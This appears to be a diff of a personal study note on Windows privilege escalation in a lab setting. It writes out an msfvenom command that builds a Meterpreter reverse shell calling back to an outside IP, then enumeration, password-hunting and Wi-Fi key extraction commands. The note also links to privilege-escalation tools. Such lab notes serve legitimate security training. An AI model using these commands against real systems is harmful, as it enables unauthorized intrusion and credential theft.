@@ -69,7 +69,7 @@ FTP Server allow `anonymous` and as password `*anything*` Login.
 
 > [!todo] 
 > Create meterpreter web reverse shell
-> `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.87 LPORT=9001 -f asp > shell.asp`
+> `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.87 LPORT=9001 -f aspx > shell.aspx`
 > 
 
 > [!todo] 
@@ -81,5 +81,142 @@ FTP Server allow `anonymous` and as password `*anything*` Login.
 > `set payload windows/meterpreter/reverse_tcp`
 > `run`
 
+> [!todo] 
+>  Open URL with `shell.aspx` on server.
+>  Now we got `meterpreter` shell!
+>  `getuid`
+>  `sysinfo`
 
+![[Pasted image 20230420150019.png]]
+
+## Initial Enumeration
+
+> [!todo] 
+> In `meterpreter` shell:
+> `shell`
+> `systeminfo`
+> `systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"`
+> `hostname`
+
+![[Pasted image 20230420153212.png]]
+
+> [!todo] 
+> See when patches where installed:
+> `wmic qfe` 
+> `wmic qfe get Caption,Description,HotFixID,InstalledOn`
+
+![[Pasted image 20230420153611.png]]
+
+> [!todo] 
+> Show connected volumes:
+>  `wmic logicaldisk`
+>  `wmic logicaldisk get caption,description,providername`
+>  `wmic logicaldisk get caption`
+
+![[Pasted image 20230420154022.png]]
+
+![[Pasted image 20230420154133.png]]
+
+
+### User Enumeration
+
+> [!todo] 
+> `whomai`
+>  `whoami /priv`
+>  `whoami /groups`
+
+![[Pasted image 20230420155409.png]]
+
+> [!todo] 
+> `net user` 
+> `net user <username>`
+> `net localgroup`
+
+![[Pasted image 20230420160933.png]]
+
+> [!todo] 
+>  `net localgroup administrators`
+
+![[Pasted image 20230420161129.png]]
+
+
+### Network Enumeration
+
+> [!todo] 
+>  `ipconfig /all` -> Under DNS, maybe we can see Domain Controller IP
+>  `arp -a`
+
+![[Pasted image 20230420164424.png]]
+
+> [!todo] 
+>  `route print`
+
+![[Pasted image 20230420164812.png]]
+
+> [!todo] 
+>  `netstat -ano`
+
+![[Pasted image 20230420165012.png]]
+
+
+### Password Hunting
+
+> [!note] 
+> More Infos and Tips:
+>  https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#search-for-file-contents
+
+> [!todo] 
+>`findstr /si password *.txt` > Search in current and subdirectory
+>`findstr /si password *.txt *.ini *.config`
+
+> [!todo] 
+> Wlan Password 
+> `netsh wlan show profile`
+> `netsh wlan show profile <SSID> key=clear`
+
+
+### AV Enumeration
+
+> [!todo] 
+> Windows Defender:
+> `sc query windefend` 
+
+![[Pasted image 20230420171557.png]]
+
+> [!todo] 
+> Find other running Antivirus Software:
+> Query running services:
+> `sc queryex type= service` 
+
+> [!todo] 
+> Check Firewall Configuration:
+>  `netsh advfirewall firewall dump`
+>  If this is not returning anything, use:
+>  `netsh firewall show state`
+
+![[Pasted image 20230420172255.png]]
+
+> [!todo] 
+> `netsh firewall show config` 
+
+![[Pasted image 20230420172448.png]]
+
+## Exploring Automated Tools
+
+### Automated Tool Overview
+
+> [!note] 
+>  Resources for this video:
+>  - WinPEAS - https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS
+>  - Windows PrivEsc Checklist - https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation
+>  - Sherlock - https://github.com/rasta-mouse/Sherlock
+>  - Watson - https://github.com/rasta-mouse/Watson
+>  - PowerUp - https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
+>  - JAWS - https://github.com/411Hall/JAWS
+>  - Windows Exploit Suggester - https://github.com/AonCyberLabs/Windows-Exploit-Suggester
+>  - Metasploit Local Exploit Suggester - https://blog.rapid7.com/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/
+>  - Seatbelt - https://github.com/GhostPack/Seatbelt
+>  - SharpUp - https://github.com/GhostPack/SharpUp
+
+![[Pasted image 20230420172800.png]]
 
